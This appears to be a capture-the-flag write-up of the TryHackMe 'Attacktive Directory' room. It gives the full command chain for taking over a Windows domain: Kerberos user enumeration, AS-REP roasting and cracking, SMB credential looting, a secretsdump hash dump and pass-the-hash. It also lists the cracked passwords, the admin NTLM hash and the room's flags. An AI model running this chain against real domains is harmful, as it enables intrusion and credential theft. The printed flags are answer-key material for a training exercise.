# Attacktive Directory

**Platform:** TryHackMe  
**OS:** Windows  
**Difficulty:** Medium  

---

## what is this room about

active directory pentesting, basically you get dropped with nothing and have to work your way to domain admin. covers kerberos abuse, smb enumeration, hash dumping and pass the hash.

---

## nmap

```
nmap -sV -sC -oN nmap.txt 10.129.185.124
```

important ports:
- 88 kerberos (means this is a DC)
- 389/3268 ldap
- 445 smb
- 3389 rdp

domain is `spookysec.local`, DC hostname is `AttacktiveDirectory.spookysec.local`

add to /etc/hosts:
```bash
echo "10.129.185.124 spookysec.local AttacktiveDirectory.spookysec.local" | sudo tee -a /etc/hosts
```

---

## user enumeration

kerberos has a weird behavior where it responds differently to valid vs invalid usernames even without credentials. kerbrute abuses this to find valid users.

```bash
./kerbrute userenum --dc 10.129.185.124 -d spookysec.local userlist.txt
```

used the THM wordlist, rockyou wont work here:
```
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
```

accounts that stood out: `svc-admin` and `backup`

---

## AS-REP roasting

svc-admin had kerberos pre-authentication disabled. this means you can ask the DC for a ticket without proving who you are first, and the response contains an encrypted blob you can crack offline.

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.129.185.124
```

got a krb5asrep hash back. cracked it with hashcat mode 18200:

```bash
hashcat -m 18200 '<hash>' passwordlist.txt
```

again use the THM passwordlist not rockyou, rockyou doesnt have it:
```
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
```

cracked: `svc-admin:management2005`

---

## SMB

listed shares with svc-admin creds:

```bash
smbclient -L \\\\10.129.185.124\\ -U spookysec.local/svc-admin%management2005
```

connected to the backup share and found `backup_credentials.txt`, it had a base64 string inside:

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

decoded to: `backup@spookysec.local:backup2517860`

---

## dumping hashes

the backup account has replication privileges on the domain. secretsdump abuses the DRSUAPI protocol (the same protocol DCs use to sync with each other) to pull all hashes out of NTDS.DIT remotely.

```bash
python3 /opt/impacket/examples/secretsdump.py -just-dc backup@10.129.185.124
```

dumped every single hash on the domain including administrator:

administrator NTLM: `0e0363213e37b94221497260b0bcb4fc`

---

## getting in

pass the hash, no need to crack the admin hash. windows uses NTLM hashes internally for auth so you can just send the hash directly.

```bash
evil-winrm -i 10.129.185.124 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

for the other users:
```bash
evil-winrm -i 10.129.185.124 -u svc-admin -p management2005
evil-winrm -i 10.129.185.124 -u backup -p backup2517860
```

---

## flags

svc-admin → `TryHackMe{K3rb3r0s_Pr3_4uth}`  
backup → `TryHackMe{B4ckM3UpSc0tty!}`  
administrator → `TryHackMe{4ctiveD1rectoryM4st3r}`  

---

## attack path

kerbrute → AS-REP roast svc-admin → crack hash → smb → backup creds → secretsdump → pass the hash → domain admin
